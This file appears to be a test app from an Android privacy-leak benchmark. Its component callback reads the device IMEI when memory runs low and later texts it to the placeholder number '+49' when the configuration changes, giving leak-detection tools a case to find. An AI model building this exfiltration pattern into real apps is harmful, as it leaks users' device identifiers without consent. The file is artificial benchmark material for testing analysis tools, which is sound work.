package de.ecspride;

import android.app.Application;
import android.content.ComponentCallbacks2;
import android.content.Context;
import android.content.res.Configuration;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MyApplication extends Application {
    ComponentCallbacks2 callbacks =
      new ComponentCallbacks2(
      ) {
        String imei;
        
        @Override
        public void onLowMemory() {
            TelephonyManager telephonyManager =
              (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = telephonyManager.getDeviceId();
        }
        
        @Override
        public void onConfigurationChanged(Configuration newConfig) {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage("+49", null, imei, null, null);
        }
        
        @Override
        public void onTrimMemory(int level) {
            
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        this.registerComponentCallbacks(callbacks);
    }
    
    @Override
    public void onTerminate() {
        super.onTerminate();
        this.unregisterComponentCallbacks(callbacks);
    }
    
    public MyApplication() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "zoS8/RIAAA==");
}
